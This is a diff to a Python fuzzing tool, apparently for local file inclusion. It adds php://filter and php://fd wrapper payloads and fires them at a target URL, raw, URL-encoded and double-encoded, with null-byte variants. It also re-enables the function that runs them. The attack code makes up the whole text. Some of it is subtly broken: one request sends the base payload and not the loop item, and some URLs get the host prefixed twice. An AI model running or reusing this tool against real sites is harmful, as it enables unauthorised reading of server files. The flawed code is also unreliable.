@@ -198,18 +198,64 @@ def wrapper_compress_fuzz(url, payload, hcode=(), hsize=(), htext=(), cookie=Non
             print(common.good_code(resp.status_code, f"{common.double_urlencode(p)}%00 [code:{resp.status_code} size:{len(resp.content)}]"))
     
     
-def wrapper_php_fuzz(url, payload, hcode=(), hsize=(), htext=(), cookie=None, redirect=False):  
+def wrapper_php_fuzz(url, payload, hcode=(), hsize=(), htext=(), cookie=None, redirect=False):
+    php_payloads = [f"php://filter/convert.base64-encode/resource={payload}",
+                    f"php://filter/zlib.deflate/convert.base64-encode/resource={payload}",
+                    f"php://filter/convert.quoted-printable-encode/resource={payload}",
+                    f"php://filter/convert.iconv.utf-8.utf-16le/resource={payload}",
+                    f"php://filter/read=string.toupper|string.rot13|string.tolower/resource={payload}",
+                    f"php://filter/string.strip_tags/resource={payload}",
+                    f"php://filter/string.toupper/string.rot13/string.tolower/resource={payload}",
+                    f"php://filter/zlib.inflate/resource={payload}",
+                    f"php://filter/convert.base64-encode/resource={payload}%00",
+                    f"php://filter/zlib.deflate/convert.base64-encode/resource={payload}%00",
+                    f"php://filter/convert.quoted-printable-encode/resource={payload}%00",
+                    f"php://filter/convert.iconv.utf-8.utf-16le/resource={payload}%00",
+                    f"php://filter/read=string.toupper|string.rot13|string.tolower/resource={payload}%00",
+                    f"php://filter/string.strip_tags/resource={payload}%00",
+                    f"php://filter/string.toupper/string.rot13/string.tolower/resource={payload}%00",
+                    f"php://filter/zlib.inflate/resource={payload}%00"]
+
     for n in range(101):
-        print(f"{url}php://fd/{n}")
-        print(f"{url}php://fd/{n}%00")
-    print(f"{url}php://filter/convert.base64-encode/resource={payload}")
-    print(f"{url}php://filter/zlib.deflate/convert.base64-encode/resource={payload}")
-    print(f"{url}php://filter/convert.quoted-printable-encode/resource={payload}")
-    print(f"{url}php://filter/convert.iconv.utf-8.utf-16le/resource={payload}")    
-    print(f"{url}php://filter/read=string.toupper|string.rot13|string.tolower/resource={payload}")
-    print(f"{url}php://filter/string.strip_tags/resource={payload}")
-    print(f"{url}php://filter/string.toupper/string.rot13/string.tolower/resource={payload}")    
-    print(f"{url}php://filter/zlib.inflate/resource={payload}")
+        fd_payloads = [f"{url}php://fd/{n}", f"{url}php://fd/{n}%00"]
+        for fd_p in fd_payloads:
+            resp = requests.get(f"{url}{fd_p}", headers=common.USER_AGENT, cookies=cookie, allow_redirects=redirect, verify=False)
+            if resp.status_code not in hcode and len(resp.content) not in hsize and not common.find_content(resp.text, htext):
+                print(common.good_code(resp.status_code, f"{fd_p} [code:{resp.status_code} size:{len(resp.content)}]"))
+            # urlencode
+            resp = requests.get(f"{url}{common.urlencode(fd_p)}", headers=common.USER_AGENT, cookies=cookie, allow_redirects=redirect, verify=False)
+            if resp.status_code not in hcode and len(resp.content) not in hsize and not common.find_content(resp.text, htext):
+                print(common.good_code(resp.status_code, f"{common.urlencode(fd_p)} [code:{resp.status_code} size:{len(resp.content)}]"))
+            resp = requests.get(f"{url}{common.urlencode(fd_p)}%00", headers=common.USER_AGENT, cookies=cookie, allow_redirects=redirect, verify=False)
+            if resp.status_code not in hcode and len(resp.content) not in hsize and not common.find_content(resp.text, htext):
+                print(common.good_code(resp.status_code, f"{common.urlencode(fd_p)}%00 [code:{resp.status_code} size:{len(resp.content)}]"))
+            # double urlencode
+            resp = requests.get(f"{url}{common.double_urlencode(fd_p)}", headers=common.USER_AGENT, cookies=cookie, allow_redirects=redirect, verify=False)
+            if resp.status_code not in hcode and len(resp.content) not in hsize and not common.find_content(resp.text, htext):
+                print(common.good_code(resp.status_code, f"{common.double_urlencode(fd_p)} [code:{resp.status_code} size:{len(resp.content)}]"))
+            resp = requests.get(f"{url}{common.double_urlencode(fd_p)}%00", headers=common.USER_AGENT, cookies=cookie, allow_redirects=redirect, verify=False)
+            if resp.status_code not in hcode and len(resp.content) not in hsize and not common.find_content(resp.text, htext):
+                print(common.good_code(resp.status_code, f"{common.double_urlencode(fd_p)}%00 [code:{resp.status_code} size:{len(resp.content)}]"))
+
+    for p in php_payloads:
+        resp = requests.get(f"{url}{payload}", headers=common.USER_AGENT, cookies=cookie, allow_redirects=redirect, verify=False)
+        if resp.status_code not in hcode and len(resp.content) not in hsize and not common.find_content(resp.text, htext):
+            print(common.good_code(resp.status_code, f"{p} [code:{resp.status_code} size:{len(resp.content)}]"))
+        # urlencode
+        resp = requests.get(f"{url}{common.urlencode(p)}", headers=common.USER_AGENT, cookies=cookie, allow_redirects=redirect, verify=False)
+        if resp.status_code not in hcode and len(resp.content) not in hsize and not common.find_content(resp.text, htext):
+            print(common.good_code(resp.status_code, f"{common.urlencode(p)} [code:{resp.status_code} size:{len(resp.content)}]"))
+        resp = requests.get(f"{url}{common.urlencode(p)}%00", headers=common.USER_AGENT, cookies=cookie, allow_redirects=redirect, verify=False)
+        if resp.status_code not in hcode and len(resp.content) not in hsize and not common.find_content(resp.text, htext):
+            print(common.good_code(resp.status_code, f"{common.urlencode(p)}%00 [code:{resp.status_code} size:{len(resp.content)}]"))
+        # double urlencode
+        resp = requests.get(f"{url}{common.double_urlencode(p)}", headers=common.USER_AGENT, cookies=cookie, allow_redirects=redirect, verify=False)
+        if resp.status_code not in hcode and len(resp.content) not in hsize and not common.find_content(resp.text, htext):
+            print(common.good_code(resp.status_code, f"{common.double_urlencode(p)} [code:{resp.status_code} size:{len(resp.content)}]"))
+        resp = requests.get(f"{url}{common.double_urlencode(p)}%00", headers=common.USER_AGENT, cookies=cookie, allow_redirects=redirect, verify=False)
+        if resp.status_code not in hcode and len(resp.content) not in hsize and not common.find_content(resp.text, htext):
+            print(common.good_code(resp.status_code, f"{common.double_urlencode(p)}%00 [code:{resp.status_code} size:{len(resp.content)}]"))
+
 
 
 def main():       
@@ -285,7 +331,7 @@ def main():
             print("\n------------------------")
             print("[!] Wrapper php fuzzing")
             print("------------------------\n")
-            #wrapper_php_fuzz(url, path, hcode=hcode, hsize=hsize, htext=htext, cookie=cookie, redirect=redirect)
+            wrapper_php_fuzz(url, path, hcode=hcode, hsize=hsize, htext=htext, cookie=cookie, redirect=redirect)
         else:
             help()
     except KeyboardInterrupt:
